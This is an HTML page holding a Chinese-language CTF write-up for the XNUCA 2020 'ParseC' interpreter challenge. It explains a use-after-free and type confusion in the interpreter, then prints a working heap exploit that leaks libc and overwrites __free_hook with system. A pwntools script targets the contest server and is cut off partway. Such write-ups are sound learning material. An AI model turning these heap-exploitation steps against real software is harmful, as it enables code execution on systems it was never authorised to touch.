@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>wp-xnuca-2020 | I0gan</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="XNUCA WP前言这一次比赛虽然只做出了一道pwn,但是感觉收获不错，只够交wp的资格了，线下可能就比较悬。也白票出题人的代码是咋写的^_^，以前也是好奇在获得shell之后是如何实现输入token的。 还有以前也想学一下解释器是怎么实现的, 这次比赛pwn parsec出了个语言解释器, 也给了对应的源码, 源码不是很多, 但是非常精小而强悍。晚上利用该漏洞调试至凌晨4点，第二天才发现原来调试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="wp-xnuca-2020">
+<meta property="og:url" content="http://blog.i0gan.cn/2020/10/31/wp-xnuca-2020/index.html">
+<meta property="og:site_name" content="I0gan">
+<meta property="og:description" content="XNUCA WP前言这一次比赛虽然只做出了一道pwn,但是感觉收获不错，只够交wp的资格了，线下可能就比较悬。也白票出题人的代码是咋写的^_^，以前也是好奇在获得shell之后是如何实现输入token的。 还有以前也想学一下解释器是怎么实现的, 这次比赛pwn parsec出了个语言解释器, 也给了对应的源码, 源码不是很多, 但是非常精小而强悍。晚上利用该漏洞调试至凌晨4点，第二天才发现原来调试">
+<meta property="og:locale">
+<meta property="article:published_time" content="2020-10-31T14:51:39.000Z">
+<meta property="article:modified_time" content="2020-11-12T06:11:33.259Z">
+<meta property="article:author" content="i0gan">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="I0gan" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">I0gan</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.i0gan.cn"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-wp-xnuca-2020" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/10/31/wp-xnuca-2020/" class="article-date">
+  <time datetime="2020-10-31T14:51:39.000Z" itemprop="datePublished">2020-10-31</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/pwn/">pwn</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      wp-xnuca-2020
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="XNUCA-WP"><a href="#XNUCA-WP" class="headerlink" title="XNUCA WP"></a>XNUCA WP</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这一次比赛虽然只做出了一道pwn,但是感觉收获不错，只够交wp的资格了，线下可能就比较悬。也白票出题人的代码是咋写的^_^，以前也是好奇在获得shell之后是如何实现输入token的。</p>
+<p>还有以前也想学一下解释器是怎么实现的, 这次比赛pwn parsec出了个语言解释器, 也给了对应的源码, 源码不是很多, 但是非常精小而强悍。晚上利用该漏洞调试至凌晨4点，第二天才发现原来调试的一直是debug模式的解释器，不得不重新改改heap的偏移,然后后面打远程打不通…泄漏远程heap时，发现远程偏移比本地小0x410，这里卡了好久，，，tcl。下次比赛好好加油!!!</p>
+<h2 id="ParseC"><a href="#ParseC" class="headerlink" title="ParseC"></a>ParseC</h2><p>给了源码</p>
+<p><a href="">下载</a></p>
+<p>这个题比较有意思, 用被解释的语言写exp。下面是这个解释器实例代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Fibonacci sequence</span></span><br><span class="line">func fun&#123; </span><br><span class="line">	<span class="keyword">if</span>(x &lt;= <span class="number">2</span>)&#123;  </span><br><span class="line">		<span class="keyword">return</span>(<span class="number">1</span>);  </span><br><span class="line">	&#125;</span><br><span class="line">	y = <span class="number">0</span>;</span><br><span class="line">	x = x - <span class="number">1</span>;</span><br><span class="line">	y = fun(x);</span><br><span class="line">	x = x - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span>(y + fun(x));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// save the Fibonacci sequence of 1 to 15 in an array </span></span><br><span class="line"><span class="function"><span class="built_in">array</span> <span class="title">arr</span><span class="params">(<span class="number">15</span>)</span></span>;	</span><br><span class="line">x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>( x &lt;= <span class="number">15</span> )&#123;</span><br><span class="line">	arr[x - <span class="number">1</span>] = fun(x);</span><br><span class="line">	x = <span class="number">1</span> + x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Fibonacci sequence:&quot;</span>);</span><br><span class="line"><span class="comment">// print the Fibonacci sequence of 1 to 15</span></span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(i &lt; <span class="number">15</span>)&#123;			</span><br><span class="line">	print(arr[i]);</span><br><span class="line">	i=i+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="vul"><a href="#vul" class="headerlink" title="vul"></a>vul</h3><p>数组越接访问,但不可赋值</p>
+<p>类型混淆</p>
+<p>字符串赋值直接赋值指针变量, 还有free时没有对指针进行清0, 导致uaf漏洞</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (token == Sym || token == ArraySym || token == StrSym) &#123;</span><br><span class="line">        symbol* s = token_val.ptr;</span><br><span class="line">        <span class="keyword">int</span> tktype = token;</span><br><span class="line">        <span class="keyword">int</span> index;</span><br><span class="line">        match(tktype);</span><br><span class="line">        <span class="keyword">if</span> (tktype == ArraySym) &#123;</span><br><span class="line">            match(<span class="string">&#x27;[&#x27;</span>);</span><br><span class="line">            index = expression();</span><br><span class="line">            match(<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">            match(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (index &gt;= <span class="number">0</span> &amp;&amp; index &lt; s-&gt;value) &#123;</span><br><span class="line">                s-&gt;pointer.<span class="built_in">list</span>[index].value = expression();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;line %.*s: Index out of range\n&quot;</span>,(<span class="keyword">int</span>)(src - old_src), old_src);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            match(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (token == Str) &#123;</span><br><span class="line">                <span class="keyword">if</span> (s-&gt;pointer.funcp)</span><br><span class="line">                    <span class="built_in">free</span>(s-&gt;pointer.funcp); <span class="comment">// not set ptr as null, uaf vul</span></span><br><span class="line">                s-&gt;pointer.funcp = (<span class="keyword">char</span>*)token_val.ptr;</span><br><span class="line">                s-&gt;type = StrSym;</span><br><span class="line">                match(Str);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (token == Char) &#123;</span><br><span class="line">                s-&gt;value = token_val.val;</span><br><span class="line">                s-&gt;type = Char;</span><br><span class="line">                match(Char);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (token == StrSym)&#123;</span><br><span class="line">                s-&gt;type = token_val.ptr-&gt;type;</span><br><span class="line">                s-&gt;value = token_val.ptr-&gt;value;</span><br><span class="line">                s-&gt;pointer = token_val.ptr-&gt;pointer;</span><br><span class="line">                match(StrSym);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                s-&gt;value = expression();</span><br><span class="line">                s-&gt;type = Num;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        match(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>开始前期, 我还以为可以利用类型混淆来实现任意读写, 由于程序是有pie的, 不能直接静态执行脚本实现任意地址读和写。</p>
+<p>数组与字符串是储存在堆里的, 原本打算是通过数组来泄漏libc, 后面发现行不通, 以double方式打印, 某些不符合double类型储存规范的, 直接为0。然而后面发现puts打印字符串可以泄漏libc, 采用字符串uaf漏洞+ 数组方式来进行修改释放后chunk的fd实现任意地址开辟, 这里需要精心的伪造.还有该解释器中定义的变量都是以double类型储存的, 在进行修改为值为地址时, 输入值为double类型的字符串, 需要进行一些转换。单个数组元素大小为0x40，实现修改的只能是采用数组来实现修改了， 那如何实现数组任意地址写入呢?就需要解释器中的字符串uaf漏洞进行修改fd, 采用partial write实现修改tcahe bin 0x51中的fd, 采用一次数组输入实现修改fd, 指向的内存, 后一次则是修改该内存的值。 修改<code>__free_hook</code>为<code>system</code>, free时传入’bin/sh;’ 即可。坑: 本地打通, 远程打不通，远程中堆中不存在0x410的缓冲chunk。本地却存在，在打远程时，先开辟0x400大小的堆，以保证本地与远程的heap偏移一致。</p>
+<h4 id="脚本执行exp"><a href="#脚本执行exp" class="headerlink" title="脚本执行exp"></a>脚本执行exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">func write_to_target &#123;</span><br><span class="line">	unuse = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;</span><br><span class="line">	<span class="function"><span class="built_in">array</span> <span class="title">arr</span><span class="params">(<span class="number">1</span>)</span></span>;</span><br><span class="line">	arr[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">	x = <span class="string">&quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span>;</span><br><span class="line">	y = x;</span><br><span class="line">	z = x;</span><br><span class="line"></span><br><span class="line">	x = <span class="string">&quot;free----&quot;</span>; </span><br><span class="line">	y = <span class="string">&quot;free------&quot;</span>;</span><br><span class="line">	z = <span class="string">&quot;free---------&quot;</span>;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;AAAAAAAA&quot;</span>);</span><br><span class="line"></span><br><span class="line">	z = x;</span><br><span class="line">	x = <span class="string">&quot;12---------------&quot;</span>; <span class="comment">// free x</span></span><br><span class="line">	x = z;</span><br><span class="line">	x = <span class="string">&quot;12345454AAAAAAA--------------&quot;</span>; <span class="comment">// free z</span></span><br><span class="line">	x = z;</span><br><span class="line"></span><br><span class="line">	x = <span class="string">&quot;/bin/sh;aasfasdfjasdfklajsdfjasdjff&quot;</span>; <span class="comment">//free x </span></span><br><span class="line">	u = <span class="string">&quot;p&quot;</span>; <span class="comment">// modify chunk fd to 0x50 chunk for modify fd</span></span><br><span class="line">	a = <span class="string">&quot;malloc&quot;</span>;</span><br><span class="line">	b = <span class="string">&quot;H&quot;</span>; <span class="comment">// modify chunk fd to arr value</span></span><br><span class="line"></span><br><span class="line">	arr[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">	n = <span class="number">0</span>;</span><br><span class="line">	read(n); <span class="comment">// input target addr to modify</span></span><br><span class="line">	arr[<span class="number">0</span>] = n;</span><br><span class="line">	<span class="function"><span class="built_in">array</span> <span class="title">arr_2</span><span class="params">(<span class="number">1</span>)</span></span>; <span class="comment">// align</span></span><br><span class="line">	<span class="function"><span class="built_in">array</span> <span class="title">arr_3</span><span class="params">(<span class="number">1</span>)</span></span>; <span class="comment">// align</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;malloc target chunk&quot;</span>);</span><br><span class="line">	<span class="function"><span class="built_in">array</span> <span class="title">arr_mod</span><span class="params">(<span class="number">1</span>)</span></span>; <span class="comment">// modify target as one_gadget</span></span><br><span class="line">	arr_mod[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	nn = <span class="number">0</span>;</span><br><span class="line">	read(nn);</span><br><span class="line">	arr_mod[<span class="number">0</span>] = nn;</span><br><span class="line"></span><br><span class="line">	x = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;</span><br><span class="line">	x = <span class="string">&quot;------------------------------------get_shell--------------------------------------&quot;</span>;</span><br><span class="line">	x = <span class="string">&quot;getshelll&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">func leak_libc &#123;</span><br><span class="line">    <span class="comment">// remote heap buffer for align heap offset</span></span><br><span class="line">	r = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;</span><br><span class="line"></span><br><span class="line">	x = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;</span><br><span class="line"></span><br><span class="line">	x = <span class="string">&quot;free x&quot;</span>; <span class="comment">// free x</span></span><br><span class="line">	<span class="comment">// leak libc</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;AAAAAAAA&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">func error_exit &#123;</span><br><span class="line">	<span class="function"><span class="built_in">array</span> <span class="title">arr</span><span class="params">(<span class="number">1</span>)</span></span>;</span><br><span class="line">	arr[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">leak_libc();</span><br><span class="line">write_to_target(t_addr);</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="交互exp"><a href="#交互exp" class="headerlink" title="交互exp"></a>交互exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: i0gan</span></span><br><span class="line"><span class="comment"># Env: Linux arch 5.8.14-arch1-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"></span><br><span class="line">elf_path  = <span class="string">&#x27;./ParseC&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line"><span class="comment">#libc_path = &#x27;/glibc/2.27/64/lib/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line">main_arena = <span class="number">0x3ebc40</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># remote server ip and port</span></span><br><span class="line">server_ip = <span class="string">&quot;123.57.4.93&quot;</span></span><br><span class="line">server_port = <span class="number">34007</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if local debug</span></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIBC  = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">	<span class="keyword">if</span>(LOCAL):</span><br><span class="line">		gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">float_to_hex</span>(<span class="params">f</span>):</span></span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">hex</span>(struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>, struct.pack(<span class="string">&#x27;&lt;f&#x27;</span>, f))[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">double_to_hex</span>(<span class="params">f</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(struct.unpack(<span class="string">&#x27;&lt;Q&#x27;</span>, struct.pack(<span class="string">&#x27;&lt;d&#x27;</span>, f))[<span class="number">0</span>])</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">double_to_long_int</span>(<span class="params">f</span>):</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">&#x27;&lt;Q&#x27;</span>, struct.pack(<span class="string">&#x27;&lt;d&#x27;</span>, f))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex_to_double</span>(<span class="params">d</span>):</span></span><br><span class="line">	d = p64(d)</span><br><span class="line">	data = struct.unpack(<span class="string">&quot;d&quot;</span>, d[:<span class="number">8</span>])</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line">	</span><br><span class="line"><span 